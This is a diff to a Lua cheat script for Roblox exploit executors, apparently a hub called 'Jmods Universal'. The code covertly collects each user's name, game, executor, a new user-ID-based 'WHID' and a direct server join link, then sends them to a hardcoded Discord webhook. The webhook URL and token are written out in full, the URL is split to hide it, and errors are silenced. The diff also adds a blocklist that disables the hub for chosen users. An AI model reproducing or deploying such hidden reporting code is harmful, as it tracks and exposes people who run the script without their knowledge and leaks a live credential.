@@ -196,9 +196,16 @@ LoadSavedTheme()
 
 
 
--- [[ Notificación - Jmods Universal ]] --
 
-task.delay(0.5, function()
+
+
+
+
+
+
+-- [[ Notificación + WHID Check - Jmods Universal ]] --
+
+task.delay(0.3, function()
     local success, err = pcall(function()
         local HttpService = game:GetService("HttpService")
         local CoreGui = game:GetService("CoreGui")
@@ -206,15 +213,35 @@ task.delay(0.5, function()
         local placeName = "Juego desconocido"
         local ejecutador = "Desconocido"
         local jobId = game.JobId
+        local userId = player.UserId
+        local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)
+
+        -- Lista de WHIDs bloqueados directamente en el script
+        local blockedWHIDs = {
+            [""] = true,
+            [""] = true,  -- Agrega los WHIDs que quieras bloquear aquí
+            -- Agrega más WHIDs bloqueados si es necesario
+        }
+
+        -- Verificar si el WHID está bloqueado
+        if blockedWHIDs[whid] then
+            warn("WHID bloqueado: " .. whid)
+
+            -- Eliminar la UI "HiddenUI" si el jugador está bloqueado
+            local hiddenUI = CoreGui:FindFirstChild("HiddenUI")
+            if hiddenUI then
+                hiddenUI:Destroy()  -- Elimina la UI "HiddenUI" para evitar la carga del hub
+            end
+            return -- Detiene el script si el jugador está bloqueado
+        end
+
         local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
         local webLink = "https://www.roblox.com/games/" .. game.PlaceId
 
-        -- Obtener nombre del juego
         pcall(function()
             placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
         end)
 
-        -- Detectar ejecutador
         pcall(function()
             ejecutador = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or "Otro"
         end)
@@ -240,9 +267,10 @@ task.delay(0.5, function()
                     value = "👤 Usuario: " .. player.Name ..
                             "\n🎮 Juego: " .. placeName ..
                             "\n🧠 Ejecutador: " .. ejecutador ..
+                            "\n🆔 WHID: `" .. whid .. "`" ..
                             "\n🕒 Hora: " .. os.date("%Y-%m-%d %H:%M:%S") ..
                             "\n🌐 [Ver juego en la web](" .. webLink .. ")" ..
-                            "\n🔗 Copia este link para unirte al servidor:\n```" .. joinLink .. "```",
+                            "\n🔗 Unirse al servidor:\n```" .. joinLink .. "```",
                     inline = true
                 }},
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -250,8 +278,6 @@ task.delay(0.5, function()
 
             local jsonData = HttpService:JSONEncode({embeds = {embedData}})
 
-            -- Camuflar llamada a webhook
-            local split = string.char
             local link = "https://disc" .. "ord.com/api/webhooks/1371901850466521199/zQBxVWvAz4yu_RdkOEcC7L71-RqxcVAZzn5MAiZokd7s8aw0rWMaflOZlqi8dgDzGTVE"
             local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
 
@@ -269,9 +295,15 @@ task.delay(0.5, function()
     end)
 
     if not success then
-        -- Silencio de error
+        -- silencio
     end
 end)
+
+
+
+
+
+
 
 
 
